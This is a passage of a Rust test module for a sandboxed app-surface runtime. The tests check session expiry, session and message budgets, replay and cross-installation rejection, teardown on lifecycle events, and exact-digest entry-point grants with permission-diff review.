        let first = compile("bridge-scripted:install_1:first");
        let second = compile("bridge-scripted:install_1:second");
        runtime
            .open_host(
                first.clone(),
                scope("owner-a@host.example", "workspace:alpha"),
                time(2),
            )
            .expect("open a");
        runtime
            .open_host(
                second.clone(),
                scope("owner-b@host.example", "workspace:beta"),
                time(2),
            )
            .expect("open b");
        assert_eq!(
            runtime
                .session_scope(&first.session_ref, time(2))
                .map(|bound| bound.principal),
            Some("owner-a@host.example".to_owned())
        );
        assert_eq!(
            runtime
                .session_scope(&second.session_ref, time(2))
                .map(|bound| bound.workspace),
            Some("workspace:beta".to_owned())
        );
    }

    #[test]
    fn ttl_expiry_and_teardown_evict_dead_sessions_from_the_registry() {
        let runtime = AppScriptedSurfaceRuntime::default();
        let plan = host_plan_for(&runtime);
        let package = candidate();
        let package_ref = reference("package-revision:reading-list");
        let bundle = package.bundle_digest().clone();
        let prefix = format!("{SCRIPTED_SURFACE_ASSET_ROUTE_PREFIX}/");
        let tail = plan.entry_url.rsplit(prefix.as_str()).next().unwrap();
        let (_, digest, path) =
            parse_scripted_surface_session_asset_address(tail).expect("parse entry address");
        // At the TTL boundary exactly, every path that lends the session
        // anything closes at once: the message is refused as a watchdog
        // trip, the asset route answers `SessionGone`, and the
        // session-bound scope lends nothing — and the expired entry is
        // EVICTED by each of those touches, so a later probe finds a
        // gone session, not a parked dead one.
        let expired = time(1) + Duration::minutes(15);
        assert_eq!(
            runtime
                .admit_bridge(
                    &message(&plan.session_ref, "req:expired"),
                    expired,
                    &package_ref,
                    AppRevision::new(1).unwrap(),
                    AppRevision::new(1).unwrap(),
                    &AppContractLimits::default(),
                )
                .unwrap_err(),
            AppScriptedSurfaceHostError::WatchdogTripped
        );
        // Reopen: the previous admit already evicted the entry, so this
        // exercises the serve/scope trips against a fresh live session.
        let plan = host_plan_for(&runtime);
        assert_eq!(
            runtime
                .serve_asset(
                    &package,
                    &plan.session_ref,
                    &digest,
                    &path,
                    admission(&package_ref, &bundle),
                    expired,
                )
                .unwrap_err(),
            AppScriptedSurfaceHostError::SessionGone
        );
        assert_eq!(runtime.session_scope(&plan.session_ref, expired), None);
        assert!(!runtime.session_live(&plan.session_ref, expired));
        assert!(!runtime.session_live(&plan.session_ref, time(2)));

        // Teardown removes the session outright.
        let runtime = AppScriptedSurfaceRuntime::default();
        let plan = host_plan_for(&runtime);
        assert_eq!(
            runtime.teardown_for_lifecycle_event(
                &plan.installation_id,
                AppLifecycleEventKind::InstallationUpdated,
            ),
            1
        );
        assert!(!runtime.session_live(&plan.session_ref, time(2)));
    }

    /// The per-installation session limit is a budget on LIVE sessions:
    /// `open_host` sweeps the installation's TTL-expired entries before
    /// counting, so a host-open after TTL silence — no bridge traffic
    /// since mint, the wedge the unfiltered count used to produce — is
    /// admitted and the expired entries are gone.
    #[test]
    fn open_host_sweeps_expired_sessions_before_counting_the_limit() {
        let runtime = AppScriptedSurfaceRuntime::default();
        let limit = AppScriptedSurfaceWatchdog::default().max_sessions_per_installation;
        let package = candidate();
        let package_ref = reference("package-revision:reading-list");
        let bundle = package.bundle_digest().clone();
        let granted = all_granted(&package);
        let compile = |session_ref: &str, at: DateTime<Utc>| {
            compile_scripted_surface_host_plan(
                &package,
                "/canvas",
                &granted,
                surface_admission_for_enabled_installation(
                    &package_ref,
                    &bundle,
                    AppInstallationId::parse("install_1").unwrap(),
                    AppRevision::new(1).unwrap(),
                    AppRevision::new(1).unwrap(),
                    reference("host:session-1"),
                    reference(session_ref),
                    reference("nonce:1"),
                    at,
                ),
                "https://home.magicbeans.ai",
                true,
                at,
            )
            .expect("plan")
        };
        for index in 0..limit {
            runtime
                .open_host(
                    compile(&format!("bridge-scripted:install_1:s{index}"), time(1)),
                    test_request_scope(),
                    time(2),
                )
                .expect("open within the budget");
        }
        // While the sessions live, the budget is real: one more open
        // refuses exactly as the limit always has.
        let ninth = compile("bridge-scripted:install_1:s8", time(1));
        assert_eq!(
            runtime
                .open_host(ninth.clone(), test_request_scope(), time(2))
                .unwrap_err(),
            AppScriptedSurfaceHostError::SessionLimit
        );
        // Past the TTL, with zero bridge traffic since mint, the same
        // open succeeds: the sweep freed the budget before counting. The
        // new plan is minted at the (post-expiry) open instant.
        let expired = time(1) + Duration::minutes(15);
        runtime
            .open_host(
                compile("bridge-scripted:install_1:s8", expired),
                test_request_scope(),
                expired,
            )
            .expect("the sweep frees the budget");
        for index in 0..limit {
            let expired_ref = reference(&format!("bridge-scripted:install_1:s{index}"));
            assert_eq!(runtime.session_scope(&expired_ref, expired), None);
            assert!(!runtime.session_live(&expired_ref, time(2)));
        }
        assert!(runtime.session_live(&reference("bridge-scripted:install_1:s8"), expired));
    }

    #[test]
    fn bridge_admission_binds_to_the_minted_session_and_its_budgets() {
        let runtime = AppScriptedSurfaceRuntime::default();
        let plan = host_plan_for(&runtime);
        let package_ref = reference("package-revision:reading-list");
        let first = message(&plan.session_ref, "req:1");
        runtime
            .admit_bridge(
                &first,
                time(2),
                &package_ref,
                AppRevision::new(1).unwrap(),
                AppRevision::new(1).unwrap(),
                &AppContractLimits::default(),
            )
            .expect("first message admitted");
        // Replay, cross-installation substitution and unknown sessions
        // all fail closed.
        assert!(matches!(
            runtime.admit_bridge(
                &first,
                time(3),
                &package_ref,
                AppRevision::new(1).unwrap(),
                AppRevision::new(1).unwrap(),
                &AppContractLimits::default(),
            ),
            Err(AppScriptedSurfaceHostError::Sandbox(
                AppSandboxError::Replay
            ))
        ));
        let mut cross = message(&plan.session_ref, "req:2");
        cross.sequence = 2;
        cross.installation_id = AppInstallationId::parse("install_2").unwrap();
        assert!(matches!(
            runtime.admit_bridge(
                &cross,
                time(4),
                &package_ref,
                AppRevision::new(1).unwrap(),
                AppRevision::new(1).unwrap(),
                &AppContractLimits::default(),
            ),
            Err(AppScriptedSurfaceHostError::Sandbox(
                AppSandboxError::SessionMismatch
            ))
        ));
        let unknown = message(&reference("bridge:unknown"), "req:x");
        assert_eq!(
            runtime
                .admit_bridge(
                    &unknown,
                    time(5),
                    &package_ref,
                    AppRevision::new(1).unwrap(),
                    AppRevision::new(1).unwrap(),
                    &AppContractLimits::default(),
                )
                .unwrap_err(),
            AppScriptedSurfaceHostError::SessionGone
        );
        // Unknown wire fields refuse to decode at all.
        assert!(
            serde_json::from_value::<AppSurfaceV1BridgeMessage>(serde_json::json!({
                "schema_version": 1,
                "request_id": "req:1",
                "sequence": 1,
                "method": "query_data",
                "origin": "null",
                "session_ref": "bridge:session-scripted",
                "nonce": "nonce:1",
                "installation_id": "install_1",
                "package_revision_ref": "package-revision:reading-list",
                "surface_revision": 1,
                "grant_revision": 1,
                "payload": {},
                "authority": "admin"
            }))
            .is_err()
        );
    }

    #[test]
    fn message_and_reload_budgets_teardown_and_lifecycle_maps_to_reasons() {
        let runtime = AppScriptedSurfaceRuntime::new(AppScriptedSurfaceWatchdog {
            max_messages: 1,
            max_reloads: 3,
            ..AppScriptedSurfaceWatchdog::default()
        });
        let plan = host_plan_for(&runtime);
        let package_ref = reference("package-revision:reading-list");
        let first = message(&plan.session_ref, "req:1");
        runtime
            .admit_bridge(
                &first,
                time(2),
                &package_ref,
                AppRevision::new(1).unwrap(),
                AppRevision::new(1).unwrap(),
                &AppContractLimits::default(),
            )
            .expect("first");
        let mut flood = message(&plan.session_ref, "req:2");
        flood.sequence = 2;
        assert_eq!(
            runtime
                .admit_bridge(
                    &flood,
                    time(3),
                    &package_ref,
                    AppRevision::new(1).unwrap(),
                    AppRevision::new(1).unwrap(),
                    &AppContractLimits::default(),
                )
                .unwrap_err(),
            AppScriptedSurfaceHostError::WatchdogTripped
        );
        assert!(!runtime.session_live(&plan.session_ref, time(4)));

        // Reload budget: the third reload is the last admissible one; the
        // fourth tears the session down for quarantine.
        let runtime = AppScriptedSurfaceRuntime::default();
        let plan = host_plan_for(&runtime);
        for second in [2, 3, 4] {
            runtime
                .note_reload(&plan.installation_id, &plan.session_ref, time(second))
                .expect("within budget");
        }
        assert_eq!(
            runtime
                .note_reload(&plan.installation_id, &plan.session_ref, time(5))
                .unwrap_err(),
            AppScriptedSurfaceHostError::ReloadBudgetExceeded
        );
        assert!(!runtime.session_live(&plan.session_ref, time(6)));
        assert!(runtime
            .admit_bridge(
                &message(&plan.session_ref, "req:after-quarantine"),
                time(6),
                &package_ref,
                AppRevision::new(1).unwrap(),
                AppRevision::new(1).unwrap(),
                &AppContractLimits::default(),
            )
            .is_err());

        // Lifecycle teardown mirrors the worker's reason mapping and kills
        // in-flight messages.
        let runtime = AppScriptedSurfaceRuntime::default();
        let plan = host_plan_for(&runtime);
        assert_eq!(
            runtime.teardown_for_lifecycle_event(
                &plan.installation_id,
                AppLifecycleEventKind::InstallationUpdated,
            ),
            1
        );
        assert!(!runtime.session_live(&plan.session_ref, time(2)));
    }

    #[test]
    fn contract_capabilities_is_answered_host_side_from_the_pinned_inventory() {
        let reply = v1_contract_capabilities_reply(&AppContractLimits::default());
        assert_eq!(
            reply["contract_version"],
            serde_json::json!(APP_SUPPORTED_PUBLIC_CONTRACT_VERSION)
        );
        assert!(reply["operation_inventory_digest"].is_string());
        assert_eq!(reply["operations"].as_array().map(Vec::len), Some(8));
    }

    /// Runtime enforcement matrix for the owner's custom-surface grant (the
    /// deliberate 1.6 deferral, closed): only an exactly granted
    /// `(route, document, digest)` triple may host.
    #[test]
    fn host_plan_admits_only_owner_granted_entry_points_with_exact_digests() {
        let package = two_entry_candidate();
        let package_ref = reference("package-revision:reading-list");
        let bundle = package.bundle_digest().clone();
        let request =
            reviewed_custom_surface_request(package.manifest().manifest(), package.members())
                .expect("hydrate")
                .expect("declared");
        assert_eq!(request.entry_points.len(), 2);
        let granted_entry = |route: &str| {
            let reviewed = request
                .entry_points
                .iter()
                .find(|entry| entry.route == route)
                .expect(route);
            AppGrantedCustomSurfaceEntryPoint {
                route: reviewed.route.clone(),
                document: reviewed.document.clone(),
                document_digest: reviewed.document_digest.clone(),
            }
        };
        // Granted subset: `/canvas` serves even though `/board` is also
        // declared and ungranted.
        let granted = vec![granted_entry("/canvas")];
        let plan = compile_scripted_surface_host_plan(
            &package,
            "/canvas",
            &granted,
            admission(&package_ref, &bundle),
            "https://home.magicbeans.ai",
            true,
            time(1),
        )
        .expect("granted subset serves");
        assert_eq!(plan.entry_route, "/canvas");
        // A declared but non-granted route refuses fail closed.
        assert_eq!(
            compile_scripted_surface_host_plan(
                &package,
                "/board",
                &granted,
                admission(&package_ref, &bundle),
                "https://home.magicbeans.ai",
                true,
                time(1),
            )
            .unwrap_err(),
            AppScriptedSurfaceHostError::EntryPointNotGranted
        );
        // Empty grant = zero surfaces: even a reviewed-and-declarable route
        // hosts nothing. The grant is never implicit-all.
        assert_eq!(
            compile_scripted_surface_host_plan(
                &package,
                "/canvas",
                &[],
                admission(&package_ref, &bundle),
                "https://home.magicbeans.ai",
                true,
                time(1),
            )
            .unwrap_err(),
            AppScriptedSurfaceHostError::EntryPointNotGranted
        );
        // A route granted for a DIFFERENT document is a substitution, not
        // the grant: refuse exactly like an ungranted route.
        let mut substituted = granted_entry("/canvas");
        substituted.document = "surfaces/board.html".to_owned();
        assert_eq!(
            compile_scripted_surface_host_plan(
                &package,
                "/canvas",
                &[substituted],
                admission(&package_ref, &bundle),
                "https://home.magicbeans.ai",
                true,
                time(1),
            )
            .unwrap_err(),
            AppScriptedSurfaceHostError::EntryPointNotGranted
        );
        // Stale digest: the exact `(route, document)` pair granted, but the
        // attested digest does not match the live entry-document bytes —
        // refuse until a fresh review re-grants the surface.
        let mut stale = granted_entry("/canvas");
        stale.document_digest = AppDigest::blake3(b"stale-document");
        assert_eq!(
            compile_scripted_surface_host_plan(
                &package,
                "/canvas",
                &[stale],
                admission(&package_ref, &bundle),
                "https://home.magicbeans.ai",
                true,
                time(1),
            )
            .unwrap_err(),
            AppScriptedSurfaceHostError::GrantedDigestStale
        );
    }

    /// The grant-revision persistence contract: surface-less grants keep
    /// their pre-1.6 record shape (decode unchanged, canonical authority
    /// digest byte-identical), and a granted surface is part of the
    /// authority identity.
    #[test]
    fn surface_less_grants_decode_and_digest_unchanged() {
        let grant = surface_less_grant();
        // A surface-less grant serializes WITHOUT the new key: the persisted
        // record bytes are exactly the pre-1.6 shape, and a pre-1.6 record
        // (which cannot contain the key) decodes via the field default.
        let value = serde_json::to_value(&grant).expect("encode");
        assert!(value.get("granted_custom_surface_entry_points").is_none());
        let decoded: AppGrantRevision = serde_json::from_value(value).expect("decode");
        assert!(decoded.granted_custom_surface_entry_points.is_empty());
        // Canonical authority digests of surface-less grants stay
        // byte-identical: the recomputed digest equals the legacy nine-axis
        // shape exactly, so grants persisted before this field continue to
        // verify at launch and contribution binding.
        let legacy_axes = serde_json::json!({
            "granted_tools": grant.granted_tools,
            "granted_agents": grant.granted_agents,
            "granted_personalities": grant.granted_personalities,
            "granted_context_reads": grant.granted_context_reads,
            "granted_personal_agent_data_access": grant.granted_personal_agent_data_access,
            "granted_data_handling_policy": grant.granted_data_handling_policy,
            "granted_background_execution": grant.granted_background_execution,
            "granted_network_policy": grant.granted_network_policy,
            "granted_resource_ceiling": grant.granted_resource_ceiling,
        });
        assert_eq!(
            app_granted_authority_digest(&grant, &[]).unwrap(),
            AppDigest::blake3_canonical_json(&legacy_axes).unwrap()
        );
        // Granting a surface changes the authority identity: omission,
        // narrowing and substitution all move the digest.
        let mut surfaced = grant.clone();
        surfaced.granted_custom_surface_entry_points = vec![AppGrantedCustomSurfaceEntryPoint {
            route: "/canvas".to_owned(),
            document: "surfaces/canvas.html".to_owned(),
            document_digest: AppDigest::blake3(b"canvas"),
        }];
        assert_ne!(
            app_granted_authority_digest(&surfaced, &[]).unwrap(),
            app_granted_authority_digest(&grant, &[]).unwrap()
        );
        // A surfaced grant round-trips through its own record bytes.
        let round: AppGrantRevision =
            serde_json::from_value(serde_json::to_value(&surfaced).unwrap()).unwrap();
        assert_eq!(
            round.granted_custom_surface_entry_points,
            surfaced.granted_custom_surface_entry_points
        );
    }

    /// Changes to the granted custom-surface set participate in the
    /// permission-diff semantics like every other granted authority.
    /// Entries compare by full `(route, document, digest)` equality, so ANY
    /// change to the set is review-visible — the conservative direction.
    #[test]
    fn granted_custom_surface_changes_are_review_visible_in_the_permission_diff() {
        let canvas = AppGrantedCustomSurfaceEntryPoint {
            route: "/canvas".to_owned(),
            document: "surfaces/canvas.html".to_owned(),
            document_digest: AppDigest::blake3(b"canvas"),
        };
        let board = AppGrantedCustomSurfaceEntryPoint {
            route: "/board".to_owned(),
            document: "surfaces/board.html".to_owned(),
            document_digest: AppDigest::blake3(b"board"),
        };
        let mut current = surface_less_grant();
        current.granted_custom_surface_entry_points = vec![canvas.clone()];

        // Narrowing (the owner drops a granted surface) is visible but is
        // not an expansion: it must not force a re-review.
        let narrowed = compute_permission_diff(&current, &surface_less_grant());
        assert_eq!(
            narrowed.custom_surface_entry_points,
            AppPermissionChangeKind::Narrowed
        );
        assert!(!narrowed.requires_review);

        // A newly granted route is an expansion that requires review.
        let mut proposed = current.clone();
        proposed.granted_custom_surface_entry_points.push(board);
        let expanded = compute_permission_diff(&current, &proposed);
        assert_eq!(
            expanded.custom_surface_entry_points,
            AppPermissionChangeKind::Expanded
        );
        assert!(expanded.requires_review);

        // A swapped entry-document digest on the same route/document is a
        // removal plus an addition under full-entry equality — an
        // expansion, conservatively.
        let mut swapped = current;
        swapped.granted_custom_surface_entry_points = vec![AppGrantedCustomSurfaceEntryPoint {
            document_digest: AppDigest::blake3(b"swapped-canvas"),
            ..canvas.clone()
        }];
        let swapped_diff = compute_permission_diff(
            &surface_less_grant_with(vec![canvas]),
            &surface_less_grant_with(swapped.granted_custom_surface_entry_points),
        );
        assert_eq!(
            swapped_diff.custom_surface_entry_points,
            AppPermissionChangeKind::Expanded
        );
        assert!(swapped_diff.requires_review);
    }

    fn surface_less_grant() -> AppGrantRevision {
        surface_less_grant_with(Vec::new())
    }

    fn surface_less_grant_with(
        entry_points: Vec<AppGrantedCustomSurfaceEntryPoint>,
    ) -> AppGrantRevision {
        let policy = AppDataHandlingPolicy {
            classification_floor: AppDataClassification::Public,
            model_processing: AppModelProcessing::LocalOnly,
            personal_agent_access: AppPersonalAgentAccess::Denied,
            memory_promotion: AppMemoryPromotion::Denied,
            external_egress: AppExternalEgress::Denied,
            approved_destinations: Vec::new(),
        };
        let ceiling = AppResourceCeiling {
            max_input_tokens: 1,
            max_output_tokens: 1,
            max_cost_microusd: 1,
            max_paid_tool_invocations: 1,
            max_active_seconds: 1,
            max_lifetime_seconds: 1,
            max_browser_network_actions: 1,
            max_concurrent_foreground_runs: 1,
            max_concurrent_background_runs: 0,
            max_records: 1,
            max_payload_bytes: 1_024,
            max_attachment_bytes: 1_024,
            max_monthly_tokens: 1,
            max_monthly_cost_microusd: 1,
        };
        AppGrantRevision {
            installation_id: AppInstallationId::parse("install_1").unwrap(),
            revision: AppRevision::new(1).unwrap(),
            package_revision_ref: reference("package-revision:reading-list"),
            requested_tools: Vec::new(),
            granted_tools: Vec::new(),
            requested_agents: Vec::new(),
            granted_agents: Vec::new(),
            requested_personalities: Vec::new(),
            granted_personalities: Vec::new(),
            requested_interactive_capabilities: Vec::new(),
            granted_interactive_capabilities: Vec::new(),
            granted_custom_surface_entry_points: entry_points,
            requested_behavior_grants: Vec::new(),
            granted_behavior_grants: Vec::new(),
            requested_event_behavior_grants: Vec::new(),
            granted_event_behavior_grants: Vec::new(),
            requested_notification_grants: Vec::new(),
            granted_notification_grants: Vec::new(),
            requested_memory_read: None,
            granted_memory_read: None,
            requested_secret_uses: None,
            granted_secret_uses: None,
            granted_any_public_host: false,
            requested_context_reads: Vec::new(),
            granted_context_reads: Vec::new(),
            requested_personal_agent_data_access: Vec::new(),
            granted_personal_agent_data_access: Vec::new(),
            requested_data_handling_policy: policy.clone(),
            granted_data_handling_policy: policy,
            granted_data_handling_policy_digest: AppDigest::blake3(b"policy"),
            requested_background_execution: AppBackgroundExecution::Denied,
            granted_background_execution: AppBackgroundExecution::Denied,
            requested_network_policy: AppNetworkPolicy::Denied,
            granted_network_policy: AppNetworkPolicy::Denied,
            requested_resource_ceiling: ceiling.clone(),
            granted_resource_ceiling: ceiling,
            approved_by: reference("actor:owner"),
            approved_at: time(1),
            authority_digest: AppDigest::blake3(b"authority"),
            revoked_at: None,
        }
    }
}
